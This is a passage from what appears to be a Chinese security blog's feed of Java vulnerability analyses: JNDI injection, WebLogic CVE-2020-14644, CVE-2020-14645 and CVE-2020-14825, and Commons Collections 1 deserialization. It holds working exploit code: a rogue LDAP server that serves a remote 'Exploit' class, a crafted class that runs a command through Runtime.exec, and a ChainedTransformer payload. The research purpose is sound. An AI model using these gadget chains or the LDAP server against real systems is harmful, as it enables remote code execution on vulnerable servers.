com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class LdapServer &#123;</span><br><span class="line"></span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main (String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        String url = &quot;http://127.0.0.1:8000/#EvilObject&quot;;</span><br><span class="line">        int port = 1234;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;,</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line"></span><br><span class="line">        private URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         *</span><br><span class="line">         */</span><br><span class="line">        public OperationInterceptor ( URL cb ) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * &#123;@inheritDoc&#125;</span><br><span class="line">         *</span><br><span class="line">         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="line">         */</span><br><span class="line">        @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&apos;.&apos;, &apos;/&apos;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&apos;#&apos;);</span><br><span class="line">            if ( refPos &gt; 0 ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class="line">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span><br><span class="line">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>LdapClient</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class LdapClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Context ctx = new InitialContext();</span><br><span class="line">            ctx.lookup(&quot;ldap://localhost:1234/EvilObject&quot;);</span><br><span class="line">            String data = &quot;This is LDAP Client.&quot;;</span><br><span class="line">            //System.out.println(serv.service(data));</span><br><span class="line">        &#125;</span><br><span class="line">        catch (NamingException e) &#123;</span><br><span class="line">            // TODO Auto-generated catch block</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://x-f1v3.github.io/images/1606640019869.png" alt="image"></p>
<h2 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h2><p>描述</p>
<blockquote>
<p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p>
</blockquote>
<p>简单的说， <code>JRMP</code> 就是一个在 <code>RMI</code> 下进行通信的协议。</p>
<h2 id="JMX"><a href="#JMX" class="headerlink" title="JMX"></a>JMX</h2><p>JMX 是 <code>Java Management Extensions</code> ，它是一个 Java 平台的管理和监控接口。<br>简单的说，就是为了监控程序的运行状态而存在的。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">Jndi注入及Spring RCE漏洞分析</a></li>
<li><a href="https://wulidecade.cn/2019/03/25/%E6%B5%85%E8%B0%88JNDI%E6%B3%A8%E5%85%A5%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">浅谈JNDI注入与java反序列化漏洞</a></li>
<li><a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Weblogic CVE-2020-14644 分析]]></title>
      <url>//blog/1605265172149.html</url>
      <content type="html"><![CDATA[<p>Weblogic CVE-2020-14644 分析<br><a id="more"></a></p>
<p>该漏洞与之前利用 <code>Comparator.compare()</code> 链的思路不同，主要是利用 <code>defineClass</code> 加载自定义类实现的远程代码执行。</p>
<p>利用类是 <code>com.tangosol.internal.util.invoke.RemoteConstructor</code>，先来看我们能够控制的部分，也就是构造方法：<br><img src="http://x-f1v3.github.io/images/1605265210794.png" alt="image"></p>
<p>传入了 <code>ClassDefinition</code>，继续跟进：<br><img src="http://x-f1v3.github.io/images/1605265219079.png" alt="image"></p>
<p>传入一个 <code>ClassIdentity</code> 类型的 <code>id</code> 和对象的字节数组，在继续跟进 <code>ClassIdentity</code>，可以看到，在其构造方法中需传入一个 <code>class</code> 获得赋值<code>sPackage</code>,<code>sBaseName</code>,<code>sVersion</code>:<br><img src="http://x-f1v3.github.io/images/1605265226910.png" alt="image"></p>
<p>在来看反序列化的部分，该类是通过 <code>readResolve</code> 进行反序列化的，<code>readResolve</code> 可以覆盖 <code>readobject</code> 的内容。<br><img src="http://x-f1v3.github.io/images/1605265233336.png" alt="image"></p>
<p>进入 <code>this.newInstance()</code> 方法：<br><img src="http://x-f1v3.github.io/images/1605265240659.png" alt="image"></p>
<p>最终进入 <code>com.tangosol.internal.util.invoke.RemotableSupport</code> 的 <code>realize</code> 方法：<br><img src="http://x-f1v3.github.io/images/1605265254139.png" alt="image"></p>
<p>由于之前未加载过该自定义类，所以会进入 <code>this.defineClass(definition)</code> 方法，跟进：<br><img src="http://x-f1v3.github.io/images/1605265367524.png" alt="image"></p>
<p>大概看了下就知道和之前的构造方法中的参数基本相同，也就是都是我们可以控制的，进入 <code>definition.getId().getName()</code>:<br><img src="http://x-f1v3.github.io/images/1605265351764.png" alt="image"></p>
<p>最终执行的是 <code>getSimpleName()</code> 方法，返回的是 <code>BaseName+$+Version</code> 的值，返回 <code>defineClass</code> 方法：<br><img src="http://x-f1v3.github.io/images/1605265333555.png" alt="image"></p>
<p>接下来就是把处理的类名、类对象的字节数组及长度传入 <code>this.defineClass</code>，由于 <code>com.tangosol.internal.util.invoke.RemotableSupport</code> 是继承 <code>ClassLoader</code> 的，所以这里的 <code>this.defineClass</code> 实际上是 <code>ClassLoader.defineClass</code> 也就是创建类，最后创建类的实例，达到实现自定义类的目的：<br><img src="http://x-f1v3.github.io/images/1605265321338.png" alt="image"></p>
<p>过程中需要注意的一点就是自定义的类名是由2部分组成的。</p>
<p>利用方式有2种，第一种就是利用重写原有的类，如这里是 <code>LambdaIdentity</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package com.tangosol.internal.util.invoke.lambda;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class LambdaIdentity$423B02C050017B24DB10DFF759AA56BF&#123;</span><br><span class="line">    public LambdaIdentity$423B02C050017B24DB10DFF759AA56BF() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;);</span><br><span class="line">        &#125; catch (IOException var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样的好处是后面的 <code>hash</code> 相对固定，第二种是先计算 <code>hash</code>，然后通过 <code>javaassist</code> 动态修改自定义类的名字。</p>
<p>整个逻辑还是相对清晰，过程也并不复杂，也提供了一种新的挖掘思路，注意构造方法中能直接传入字节数组的类</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Weblogic </tag>
            
            <tag> Java </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Weblogic CVE-2020-14645 分析]]></title>
      <url>//blog/1605087292960.html</url>
      <content type="html"><![CDATA[<p>Weblogic CVE-2020-14645 漏洞分析</p>
<a id="more"></a>
<p>调用链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">extractComplex:432, UniversalExtractor (com.tangosol.util.extractor)</span><br><span class="line">extract:175, UniversalExtractor (com.tangosol.util.extractor)</span><br><span class="line">compare:71, ExtractorComparator (com.tangosol.util.comparator)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure></p>
<p>可以看到前面部分是 CC 链，作用就是使用的 <code>gadget</code> 可以从 <code>PriorityQueue.readObject()</code> 直接到 <code>Comparator.compare()</code>，这样 <code>gadget</code> 相对来说比较好找。</p>
<p>直接看到 <code>UniversalExtractor.extract</code>：<br><img src="http://x-f1v3.github.io/images/1605087356446.png" alt="image"></p>
<p>在 <code>if</code> 中有个 <code>targetPrev.getMethod().invoke</code>，但前提条件是 <code>oTarget.getClass() == targetPrev.getTargetClass()</code>, <code>oTarget</code> 是能被控制的，但是肯定不能是特定的类型，所以只能进入 <code>else</code> ，进入 <code>extractComplex</code> 方法：<br><img src="http://x-f1v3.github.io/images/1605087373481.png" alt="image"></p>
<p>先来看到其中 <code>this.getCanonicalName()</code> 方法：<br><img src="http://x-f1v3.github.io/images/1605087392165.png" alt="image"></p>
<p>接着进入 <code>CanonicalNames.computeValueExtractorCanonicalName</code>：<br><img src="http://x-f1v3.github.io/images/1605087400823.png" alt="image"></p>
<p>很明显，该方法就是限制反射调用的方法必须以 <code>get</code>、<code>is</code> 开头，最后返回去除2个开头后的方法名，继续回到 <code>extractComplex</code> 方法：<br><img src="http://x-f1v3.github.io/images/1605087410210.png" alt="image"></p>
<p>接下来执行到 <code>ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);</code>, 看命名就知道了，是寻找类中的方法，其中 <code>clzTarget</code> 是传入的类，<code>clzParam</code> 是参数，<code>BEAN_ACCESSOR_PREFIXES</code> 就是 <code>get</code>、<code>is</code>，然后对之前分割的方法再次拼接：<br><img src="http://x-f1v3.github.io/images/1605087426470.png" alt="image"></p>
<p>最后调用到 <code>method.invoke(oTarget, aoParam)</code>:<br><img src="http://x-f1v3.github.io/images/1605087441378.png" alt="image"><br><img src="http://x-f1v3.github.io/images/1605087452052.png" alt="image"><br><img src="http://x-f1v3.github.io/images/1605087485285.png" alt="image"></p>
<p>从上述过程中可以看出，限制条件就是反射调用的方法必须是以 <code>get</code>，<code>is</code> 开头，至于方法参数貌似可以在构造犯法中传入的，所以并不是限制：<br><img src="http://x-f1v3.github.io/images/1605087468088.png" alt="image"></p>
<p>过程比较简单清晰，而且只影响 <code>12.2.1.4.0</code> 版本，影响较小。</p>
<p>最新版的补丁是把 <code>com.tangosol.util.extractor.AbstractExtractor</code> 这个父类加入黑名单了，所以继承这个类的都不能反序列化了。</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Weblogic </tag>
            
            <tag> Java </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Weblogic CVE-2020-14825 分析]]></title>
      <url>//blog/1604564457789.html</url>
      <content type="html"><![CDATA[<p>Weblogic CVE-2020-14825 漏洞分析<br><a id="more"></a><br>调用链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">getAttributeValueFromObject:82, MethodAttributeAccessor (org.eclipse.persistence.internal.descriptors)</span><br><span class="line">getAttributeValueFromObject:61, MethodAttributeAccessor (org.eclipse.persistence.internal.descriptors)</span><br><span class="line">extract:51, LockVersionExtractor (oracle.eclipselink.coherence.integrated.internal.cache)</span><br><span class="line">compare:70, ExtractorComparator (com.tangosol.util.comparator)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure></p>
<p>可以看到前面部分还是熟悉的 CC 链，原理一致，不在多说：<br><img src="http://x-f1v3.github.io/images/1604564542034.png" alt="image"></p>
<p>看到 <code>com.tangosol.util.comparator.compare</code>:<br><img src="http://x-f1v3.github.io/images/1604564551124.png" alt="image"></p>
<p>因为传入的实例不属于 <code>Entry</code> 类，所以会执行后面的 <code>this.m_extractor.extract(o2)</code>，从利用链可以看出这里的 <code>this.m_extractor</code> 是  <code>oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor</code>，继续跟进他的 <code>extract</code> 方法：<br><img src="http://x-f1v3.github.io/images/1604564560852.png" alt="image"></p>
<p>直接进入 <code>this.accessor.getAttributeValueFromObject</code> 方法，其中 <code>this.accessor</code> 是可以直接从构造方法传入的，也就是能被控制的，从利用链看出这里传入的是 <code>org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor</code>，先判断 <code>this.accessor.isInitialized()</code>:<br><img src="http://x-f1v3.github.io/images/1604564573624.png" alt="image"></p>
<p>要满足条件，只需要 <code>this.getMethod</code> 和 <code>this.isWriteOnly()</code> 不为空即可,其中 <code>this.isWriteOnly()</code> 可以通过父类的 <code>setIsWriteOnly</code> 赋值：<br><img src="http://x-f1v3.github.io/images/1604564584727.png" alt="image"></p>
<p><code>this.getMethod</code> 后面细说。<br>跟进其 <code>getAttributeValueFromObject</code> 方法：<br><img src="http://x-f1v3.github.io/images/1604564594411.png" alt="image"></p>
<p>可以看到这里调用了反射，但是 <code>this.getMethod</code> 没有明确，看下 <code>this.getMethod</code> 是如何赋值的：<br><img src="http://x-f1v3.github.io/images/1604564609311.png" alt="image"></p>
<p>有个 <code>transient</code> 关键字，所以这个属性不会被序列化，但该类中又恰好有 <code>setGetMethod</code> 方法，可以通过该方法对 <code>getMethod</code> 属性进行赋值，也是我们能够控制的，通过也满足了前面的 <code>this.accessor.isInitialized()</code> 的条件。<br><img src="http://x-f1v3.github.io/images/1604564625768.png" alt="image"></p>
<p>至此，所以整个利用链都能走通了。<br><img src="http://x-f1v3.github.io/images/1604564634073.png" alt="image"></p>
<p>如何继续挖呢？补丁的黑名单只限制了 <code>oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor</code> 这个类，可以看看有无类似的类<br><img src="http://x-f1v3.github.io/images/1604564671259.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Weblogic </tag>
            
            <tag> Java </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Commonscollections1 反序列化]]></title>
      <url>//blog/1604562905880.html</url>
      <content type="html"><![CDATA[<p>Commonscollections 系列反序列化学习<br><a id="more"></a></p>
<h2 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Commons Collections 3.1</span><br><span class="line">jdk7或jdk8</span><br></pre></td></tr></table></figure>
<h2 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h2><h3 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">           AnnotationInvocationHandler.readObject()</span><br><span class="line">               Map(Proxy).setValue()</span><br><span class="line">                       TransformedMap.checkSetValue()</span><br><span class="line">                           ChainedTransformer.transform()</span><br><span class="line">                               ConstantTransformer.transform()</span><br><span class="line">                               InvokerTransformer.transform()</span><br><span class="line">                                   Method.invoke()</span><br><span class="line">                                       Class.getMethod()</span><br><span class="line">                               InvokerTransformer.transform()</span><br><span class="line">                                   Method.invoke()</span><br><span class="line">                                       Runtime.getRuntime()</span><br><span class="line">                               InvokerTransformer.transform()</span><br><span class="line">                                   Method.invoke()</span><br><span class="line">                                       Runtime.exec()</span><br></pre></td></tr></table></figure>
<p>按照触发流程，调试分析，先看 <code>InvokerTransformer</code> 类：<br><img src="http://x-f1v3.github.io/images/1604563052923.png" alt="image"></p>
<p>存在一个构造方法接收3个参数，包括方法名，参数类，参数值，<br>存在 <code>transform</code> 方法，接收的参数是某个类，然后反射调用这个类，并执行通过构造方法中所获得的方法，可以看到类、方法、参数都是从外部输入，也就是说能够执行任意类的含任意参数的任意方法。<br>在看 <code>ConstantTransformer</code> 类：</p>
<p><img src="http://x-f1v3.github.io/images/1604563132390.png" alt="image"></p>
<p>构造方法是接收一个任意类，<code>transform</code> 方法是无论参数是什么，都会直接返回通过构造方法获得的任意类，<br>接下来是 <code>ChainedTransformer</code> 类：</p>
<p><img src="http://x-f1v3.github.io/images/1604563153671.png" alt="image"></p>
<p>构造方法是接收一个 <code>Transformer</code> 类数组，<code>transform</code> 方法是依次执行 <code>Transformer</code> 类数组中每一个 <code>Transformer</code> 类的 <code>transform</code> 方法，且每一个<code>transform</code> 方法得到的返回值，都是后面的 <code>transform</code> 方法的参数。<br>而前面说到 <code>ConstantTransformer</code> 类的 <code>transform</code> 方法无论参数是什么，都会直接返回通过构造方法获得的任意类。这就非常适合当作 <code>Transformer</code> 类数组的第一个元素。再加上 <code>InvokerTransformer</code> 类的 <code>transform</code> 方法能够执行任意类的含任意参数的任意方法,就能够构造出执行命令的点：</p>
<p><img src="http://x-f1v3.github.io/images/1604563167594.png" alt="image"></p>
<p>payload：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[] &#123;String.class &#125;,<span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">ChainedTransformer Chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Chain.transform(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>构造的 payload 也是非常巧妙，运用反射调用反射，仔细研究下的话，实际还是有点复杂的，需要对 Java 反射机制运用的非常熟练才行。<br>一行一行分析:<br><code>new ConstantTransformer(Runtime.class)</code> 由之前的分析得出会返回 <code>Runtime.class</code> 并且作为参数会传入到下个 <code>InvokerTransformer.transform</code> 中，<br><code>new InvokerTransformer(&quot;getMethod&quot;, new Class[]{ String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0] })</code> 得到 <code>Runtime.class</code> 参数，这里注意的是，由于传入的是 <code>Runtime.class</code> 是类，而不是类实例，所以 <code>input.getClass()</code> 得到的是 <code>java.lang.Class</code>,而不是 <code>java.lang.Runtime</code>:<br><img src="http://x-f1v3.github.io/images/1604563187942.png" alt="image"></p>
<p>这也是我们无法直接通过反射调用 <code>getRuntime</code> 方法，而需要通过反射调用反射调用<code>getRuntime</code> 方法的原因。这里通过反射调用 <code>getMethod</code> 方法，参数是 <code>getRuntime</code>。最后调用 <code>getMethod</code> 方法时，因为 <code>invoke</code> 的第一个参数还是 <code>Runtime.class</code>。所以后面能正确执行 <code>getRuntime</code> 方法。<br><img src="http://x-f1v3.github.io/images/1604563200521.png" alt="image"></p>
<p><code>new InvokerTransformer(&quot;invoke&quot;, new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]})</code>，这里就是通过反射调用 <code>invoke</code> 方法，执行前面的 <code>getMethod</code> 方法,相当于第二层反射，真正执行的是 <code>getRuntime</code>，最终返回 <code>Runtime</code> 实例。<br><img src="http://x-f1v3.github.io/images/1604563213543.png" alt="image"></p>
<p><code>new InvokerTransformer(&quot;exec&quot;,new Class[] {String.class },new Object[] {&quot;open /Applications/Calculator.app&quot;})</code> 最后执行 <code>Runtime</code> 实例的 <code>exec</code> 方法，执行系统命令。<br>为了方便理解，抽象出来的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object a = Runtime.class.getClass().getMethod(<span class="string">"getMethod"</span>,<span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;).invoke(Runtime.class,<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">Object b = a.getClass().getMethod(<span class="string">"invoke"</span>,<span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;).invoke(a,<span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;);</span><br><span class="line">b.getClass().getMethod(<span class="string">"exec"</span>,String.class ).invoke(b,<span class="string">"open /Applications/Calculator.app"</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1604563228530.png" alt="image"></p>
<p>看看其他大佬的图：<br><img src="http://x-f1v3.github.io/images/1604563240088.png" alt="image"></p>
<p>总的来说，第一层反射只是外壳，里面的通过反射调用 <code>getRuntime</code> 方法，获取 <code>Runtime</code> 实例是精华。大佬就是牛逼。<br>继续分析，既然通过一顿操作知道了 <code>ChainedTransformer.transform</code> 能够执行命令，那么还需要找到能自动触发这行代码的地方。<br>看到反序列化的利用链 <code>TransformedMap.checkSetValue()</code><br><img src="http://x-f1v3.github.io/images/1604563250718.png" alt="image"></p>
<p>可以看到该方法，会执行 <code>this.valueTransformer.transform(value)</code> ，而 <code>this.valueTransformer</code> 可以通过 <code>decorate</code> 方法进行赋值，同时也可以传入一个 <code>map</code>类。</p>
<blockquote>
<p>TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法，第三个参数为Map对象内的value要经过的转化方法。</p>
</blockquote>
<p>所以这段按照要求进行如下构造：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">    <span 